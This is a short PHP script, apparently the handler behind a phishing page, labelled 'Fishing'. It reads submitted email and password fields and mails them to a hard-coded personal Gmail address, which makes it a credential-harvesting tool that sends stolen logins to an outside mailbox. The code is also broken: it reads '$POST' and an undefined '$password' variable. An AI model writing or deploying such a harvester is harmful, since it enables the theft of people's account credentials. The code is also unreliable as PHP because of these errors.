<?php 



$mail = "email: ".$POST['val'];
$pass = "password: ".$POST['val1'];


$to = 'narekxachatryan1998@gmail.com';
$subject = 'Fishing';
$message = 'Email: ' . $mail . ' | ' .'Password: '. $password;
// Sending email
if(mail($to, $subject, $message)){
    // echo 'Your mail has been sent successfully.';
    print $mail;
} else{
    echo 'Unable to send email. Please try again.';
}